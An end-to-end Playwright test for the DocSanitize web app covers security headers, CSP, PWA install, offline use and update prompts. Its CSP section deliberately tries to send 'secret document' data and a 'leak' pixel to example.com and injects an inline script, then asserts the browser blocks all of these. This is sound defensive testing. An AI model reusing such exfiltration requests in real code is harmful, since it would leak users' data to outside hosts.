// Milestone 9: security headers + CSP, installable PWA, offline use and the update prompt.
// Run via `npm run e2e` (serves ./out with vercel.json's headers); outputs land in e2e/.output/.
import { chromium } from "playwright-core";
import assert from "node:assert/strict";
import { mkdirSync, readFileSync, writeFileSync } from "node:fs";
import { fileURLToPath, pathToFileURL } from "node:url";

const repo = fileURLToPath(new URL("..", import.meta.url));
const mod = (path) => import(pathToFileURL(`${repo}/${path}`).href);
const { getDocument } = await mod("node_modules/pdfjs-dist/legacy/build/pdf.mjs");
const metaFx = await mod("src/lib/metadata/__tests__/fixtures.ts");
const officeFx = await mod("src/lib/office/__tests__/fixtures.ts");

const base = process.env.E2E_BASE_URL ?? "http://localhost:3123";
const step = (s) => console.log("✓", s);
const swPath = `${repo}/out/sw.js`;

mkdirSync("m9", { recursive: true });
writeFileSync("m9/plan.docx", officeFx.sampleDocx(metaFx.TINY_JPEG));

// ---------------------------------------------------------------- Headers, as a host sends them
{
  const res = await fetch(`${base}/tools/merge/`);
  const csp = res.headers.get("content-security-policy") ?? "";
  for (const directive of ["default-src 'self'", "connect-src 'self'", "frame-ancestors 'none'", "object-src 'none'", "form-action 'none'"]) {
    assert.ok(csp.includes(directive), `header CSP has ${directive}`);
  }
  assert.equal(res.headers.get("x-content-type-options"), "nosniff");
  assert.equal(res.headers.get("referrer-policy"), "no-referrer");
  const html = await res.text();
  const meta = /<meta http-equiv="Content-Security-Policy" content="([^"]+)"/.exec(html)?.[1] ?? "";
  assert.ok(meta.includes("connect-src 'self'") && /script-src 'self' 'wasm-unsafe-eval'( 'sha256-[^']+')+;/.test(meta), "meta CSP with script hashes");
  assert.ok(!/script-src[^;]*'unsafe-inline'/.test(meta), "no inline scripts beyond the hashed ones");
  assert.ok(html.indexOf("Content-Security-Policy") < html.indexOf("<script"), "the meta policy comes before every script");
  assert.match((await fetch(`${base}/sw.js`)).headers.get("cache-control") ?? "", /no-cache/);
}
step("security headers sent; every page carries a hash-based CSP <meta> ahead of its scripts");

const browser = await chromium.launch();
const ctx = await browser.newContext({ viewport: { width: 1440, height: 1000 }, acceptDownloads: true });
await ctx.addInitScript(() => {
  window.__violations = [];
  document.addEventListener("securitypolicyviolation", (e) => window.__violations.push(`${e.effectiveDirective} ${e.blockedURI}`));
});
const page = await ctx.newPage();
const errors = [];
const origins = new Set();
const outside = { requests: 0, blocked: [] };
const watch = (p) => {
  p.on("console", (m) => m.type() === "error" && errors.push(m.text()));
  p.on("pageerror", (e) => errors.push(e.message));
  p.on("request", (r) => origins.add(new URL(r.url()).origin));
  p.on("request", (r) => r.url().startsWith("https://example.com/") && outside.requests++);
  p.on("requestfailed", (r) => r.url().startsWith("https://example.com/") && outside.blocked.push(r.failure()?.errorText));
  p.on("response", (r) => r.status() >= 400 && errors.push(`${r.status()} ${r.url()}`));
};
watch(page);
async function download(trigger) {
  const [d] = await Promise.all([page.waitForEvent("download"), trigger()]);
  return { name: d.suggestedFilename(), bytes: readFileSync(await d.path()) };
}

// ---------------------------------------------------------------- CSP in the browser
await page.goto(base + "/", { waitUntil: "networkidle" });
assert.deepEqual(await page.evaluate(() => window.__violations), [], "the app itself breaks no rule");
const attempts = await page.evaluate(async () => {
  const result = {};
  try {
    await fetch("https://example.com/upload", { method: "POST", body: "secret document" });
    result.fetch = "sent";
  } catch {
    result.fetch = "blocked";
  }
  const img = new Image();
  img.src = "https://example.com/pixel.gif?leak=1";
  await new Promise((r) => { img.onerror = r; img.onload = r; });
  const script = document.createElement("script");
  script.textContent = "window.__injected = true";
  document.body.append(script);
  await new Promise((r) => setTimeout(r, 200));
  result.injected = window.__injected === true;
  result.violations = window.__violations;
  return result;
});
assert.equal(attempts.fetch, "blocked", "uploads to another site are blocked by the browser");
assert.equal(attempts.injected, false, "injected inline scripts don't run");
assert.ok(attempts.violations.includes("connect-src https://example.com/upload"), JSON.stringify(attempts.violations));
assert.ok(attempts.violations.some((v) => v.startsWith("img-src https://example.com/")));
assert.ok(attempts.violations.some((v) => v.startsWith("script-src-elem inline")));
// The browser never sent them: each attempt failed as blocked by the policy.
assert.equal(outside.blocked.length, outside.requests, JSON.stringify(outside));
assert.ok(outside.blocked.every((reason) => /csp/i.test(reason)), JSON.stringify(outside));
origins.delete("https://example.com");
// Those refusals are logged as console errors; they were the point of the test.
errors.splice(0, errors.length, ...errors.filter((e) => !/example\.com|inline script/.test(e)));
step("the browser refuses requests to other sites and injected scripts (connect-src, img-src, script-src)");

// ---------------------------------------------------------------- Installable
const manifestHref = await page.locator('link[rel="manifest"]').getAttribute("href");
const manifest = await (await fetch(base + manifestHref)).json();
assert.equal(manifest.short_name, "DocSanitize");
assert.equal(manifest.display, "standalone");
assert.equal(manifest.start_url, "/");
for (const icon of manifest.icons) {
  const png = new Uint8Array(await (await fetch(base + icon.src)).arrayBuffer());
  const view = new DataView(png.buffer);
  const [w, h] = icon.sizes.split("x").map(Number);
  assert.deepEqual([view.getUint32(16), view.getUint32(20)], [w, h], `${icon.src} is ${icon.sizes}`);
}
assert.ok(manifest.icons.some((i) => i.purpose === "maskable"));
assert.ok(await page.locator('link[rel="icon"][type="image/svg+xml"]').count());
assert.ok(await page.locator('link[rel="apple-touch-icon"]').count());
step(`web app manifest with ${manifest.icons.length} icons (incl. maskable), SVG favicon and Apple touch icon`);

// ---------------------------------------------------------------- Service worker precache
const precache = JSON.parse(/const PRECACHE = (\[[\s\S]*?\]);/.exec(readFileSync(swPath, "utf8"))[1]);
await page.evaluate(() => navigator.serviceWorker.ready);
await page.waitForFunction(() => navigator.serviceWorker.controller !== null);
const cached = async () =>
  page.evaluate(async () => {
    const names = (await caches.keys()).filter((n) => n.startsWith("docsanitize-"));
    const keys = names.length === 1 ? await (await caches.open(names[0])).keys() : [];
    return { names, paths: keys.map((r) => new URL(r.url).pathname).sort() };
  });
const before = await cached();
assert.equal(before.names.length, 1);
assert.deepEqual(before.paths, [...precache].sort(), "everything in the build is cached, nothing else");
assert.ok(!precache.some((p) => p.endsWith(".map") || p === "/_headers"));
step(`service worker active; ${precache.length} files cached for offline use`);

// ---------------------------------------------------------------- Offline
await ctx.setOffline(true);
const failed = [];
// (Prefetches cancelled by a navigation fail as ERR_ABORTED, online or not.)
page.on("requestfailed", (r) => r.failure()?.errorText !== "net::ERR_ABORTED" && failed.push(`${r.method()} ${r.url()} ${r.failure()?.errorText}`));
await page.reload({ waitUntil: "load" });
await page.getByRole("heading", { level: 1 }).first().waitFor();
await page.goto(base + "/tools/word-to-pdf/");
await page.locator('input[type="file"]').setInputFiles(["m9/plan.docx"]);
await page.getByRole("button", { name: "Convert to PDF" }).click();
await page.getByText("PDF ready").waitFor();
await page.locator("section[aria-label='Result preview'] canvas:not(.invisible)").first().waitFor();
const pdf = await download(() => page.getByRole("button", { name: "Download result" }).click());
const task = getDocument({ data: new Uint8Array(pdf.bytes), useSystemFonts: false });
const first = await (await task.promise).getPage(1);
const text = (await first.getTextContent()).items.map((i) => i.str).join(" ");
await task.destroy();
assert.match(text, /Quarterly Plan/);
step("offline: reloaded the app, opened another tool and converted Word to PDF (fonts and workers from cache)");

// Client-side navigation from the sidebar, then a PDF tool with thumbnails (pdf.js + its worker).
await page.locator('aside a[href="/tools/merge/"]').click();
await page.waitForURL("**/tools/merge/");
await page.getByRole("heading", { level: 1, name: /Merge/ }).waitFor();
await page.goto(base + "/tools/compress/");
await page.locator('input[type="file"]').setInputFiles({ name: "plan.pdf", mimeType: "application/pdf", buffer: pdf.bytes });
await page.locator("canvas:not(.invisible)").first().waitFor();
await page.screenshot({ path: "m9-01-offline.png" });
assert.deepEqual(failed, [], "no request needed the network");
assert.deepEqual((await cached()).paths, [...precache].sort(), "the worker never stored a user's file");
await ctx.setOffline(false);
step("offline: sidebar navigation and PDF previews work; nothing failed; the cache holds only app files");

// ---------------------------------------------------------------- Update prompt
const original = readFileSync(swPath, "utf8");
const fresh = await ctx.newPage();
watch(fresh);
try {
  await fresh.goto(base + "/", { waitUntil: "networkidle" });
  writeFileSync(swPath, `${original}\n// e2e: a new deployment\n`);
  await fresh.evaluate(() => {
    window.__beforeUpdate = true;
    return navigator.serviceWorker.getRegistration().then((r) => r.update());
  });
  const prompt = fresh.getByRole("status").filter({ hasText: "A new version of DocSanitize is ready" });
  await prompt.waitFor({ timeout: 60_000 });
  await fresh.screenshot({ path: "m9-02-update-prompt.png" });
  await Promise.all([fresh.waitForEvent("load"), prompt.getByRole("button", { name: "Reload now" }).click()]);
  assert.equal(await fresh.evaluate(() => window.__beforeUpdate), undefined, "the page reloaded");
  const state = await fresh.evaluate(async () => {
    const r = await navigator.serviceWorker.getRegistration();
    return { waiting: !!r.waiting, active: r.active?.state, text: await (await fetch("/sw.js", { cache: "no-store" })).text() };
  });
  assert.equal(state.waiting, false);
  assert.equal(state.active, "activated");
  assert.ok(state.text.includes("e2e: a new deployment"));
  step("a new deployment is offered as “Reload now”, which switches to it");

  // The development stand-in (public/sw.js) retires a production worker left on the origin.
  writeFileSync(swPath, readFileSync(`${repo}/public/sw.js`));
  await fresh.evaluate(() => navigator.serviceWorker.getRegistration().then((r) => r.update()));
  await fresh.waitForFunction(async () => (await navigator.serviceWorker.getRegistrations()).length === 0 && (await caches.keys()).length === 0, null, { timeout: 30_000 });
  step("the development stand-in unregisters an old production worker and clears its caches");
} finally {
  writeFileSync(swPath, original);
}

// ---------------------------------------------------------------- Dark theme
const dark = await browser.newContext({ viewport: { width: 1440, height: 1000 }, colorScheme: "dark" });
const p2 = await dark.newPage();
watch(p2);
await p2.goto(base + "/", { waitUntil: "networkidle" });
assert.equal(await p2.locator('meta[name="theme-color"][media="(prefers-color-scheme: dark)"]').getAttribute("content"), "#2b2927");
await p2.screenshot({ path: "m9-03-dark.png" });
step("theme colour follows the colour scheme");

console.log("errors:", errors.length ? errors : "none");
console.log("origins:", [...origins]);
assert.deepEqual(errors, []);
assert.deepEqual([...origins], [new URL(base).origin]);
await browser.close();
